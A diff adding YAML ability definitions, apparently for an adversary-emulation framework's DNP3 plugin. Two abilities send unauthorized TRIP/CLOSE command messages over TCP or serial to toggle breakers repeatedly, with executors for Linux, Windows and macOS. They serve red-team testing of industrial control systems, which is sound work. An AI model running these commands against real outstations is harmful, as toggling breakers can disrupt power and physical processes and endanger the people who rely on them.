@@ -1,0 +1,91 @@
+- id: 445d53f6-f598-4cc5-b1c5-19a1462cfe0b
+  name: DNP3 (TCP) - Toggle (Two Output Model)
+  description: Toggle breaker(s) using complementary two-output model (uses TRIP/CLOSE trip codes on the same index).
+  tactic: impair-process-control
+  technique_id: T0855
+  technique_name: Unauthorized Command Message
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      ./dnp3-actions tcp #{dnp3.server.ip} #{dnp3.local.link} #{dnp3.remote.link}
+      toggle-two-output #{dnp3.operate.mode} --indices #{dnp3.toggle.indices} 
+      --iterations #{dnp3.toggle.iterations} --delay #{dnp3.toggle.delay_ms}
+    payloads:
+    - dnp3-actions
+    timeout: 60
+  - platform: windows
+    name: psh
+    command: >
+      .\dnp3-actions.exe tcp #{dnp3.server.ip} #{dnp3.local.link} #{dnp3.remote.link}
+      toggle-two-output #{dnp3.operate.mode} --indices #{dnp3.toggle.indices} 
+      --iterations #{dnp3.toggle.iterations} --delay #{dnp3.toggle.delay_ms}
+    payloads:
+    - dnp3-actions.exe
+    timeout: 60
+  - platform: windows
+    name: cmd
+    command: >
+      .\dnp3-actions.exe tcp #{dnp3.server.ip} #{dnp3.local.link} #{dnp3.remote.link}
+      toggle-two-output #{dnp3.operate.mode} --indices #{dnp3.toggle.indices} 
+      --iterations #{dnp3.toggle.iterations} --delay #{dnp3.toggle.delay_ms}
+    payloads:
+    - dnp3-actions.exe
+    timeout: 60
+  - platform: darwin
+    name: sh
+    command: >
+      ./dnp3-actions_darwin tcp #{dnp3.server.ip} #{dnp3.local.link} #{dnp3.remote.link}
+      toggle-two-output #{dnp3.operate.mode} --indices #{dnp3.toggle.indices} 
+      --iterations #{dnp3.toggle.iterations} --delay #{dnp3.toggle.delay_ms}
+    payloads:
+    - dnp3-actions_darwin
+    timeout: 60
+  repeatable: false
+  plugin: dnp3
+
+- id: a4ab6d9e-e65a-4ef0-8a35-e93d6491e7a0
+  name: DNP3 (Serial) - Toggle (Two Output Model)
+  description: Toggle breaker(s) using complementary two-output model (uses TRIP/CLOSE trip codes on the same index).
+  tactic: impair-process-control
+  technique_id: T0855
+  technique_name: Unauthorized Command Message
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      ./dnp3-actions serial #{dnp3.server.serial_device} #{dnp3.local.link} #{dnp3.remote.link}
+      toggle-two-output #{dnp3.operate.mode} --indices #{dnp3.toggle.indices} 
+      --iterations #{dnp3.toggle.iterations} --delay #{dnp3.toggle.delay_ms}
+    payloads:
+    - dnp3-actions
+    timeout: 60
+  - platform: windows
+    name: psh
+    command: >
+      .\dnp3-actions.exe serial #{dnp3.server.serial_device} #{dnp3.local.link} #{dnp3.remote.link}
+      toggle-two-output #{dnp3.operate.mode} --indices #{dnp3.toggle.indices} 
+      --iterations #{dnp3.toggle.iterations} --delay #{dnp3.toggle.delay_ms}
+    payloads:
+    - dnp3-actions.exe
+    timeout: 60
+  - platform: windows
+    name: cmd
+    command: >
+      .\dnp3-actions.exe serial #{dnp3.server.serial_device} #{dnp3.local.link} #{dnp3.remote.link}
+      toggle-two-output #{dnp3.operate.mode} --indices #{dnp3.toggle.indices} 
+      --iterations #{dnp3.toggle.iterations} --delay #{dnp3.toggle.delay_ms}
+    payloads:
+    - dnp3-actions.exe
+    timeout: 60
+  - platform: darwin
+    name: sh
+    command: >
+      ./dnp3-actions_darwin serial #{dnp3.server.serial_device} #{dnp3.local.link} #{dnp3.remote.link}
+      toggle-two-output #{dnp3.operate.mode} --indices #{dnp3.toggle.indices} 
+      --iterations #{dnp3.toggle.iterations} --delay #{dnp3.toggle.delay_ms}
+    payloads:
+    - dnp3-actions_darwin
+    timeout: 60
+  repeatable: false
+  plugin: dnp3
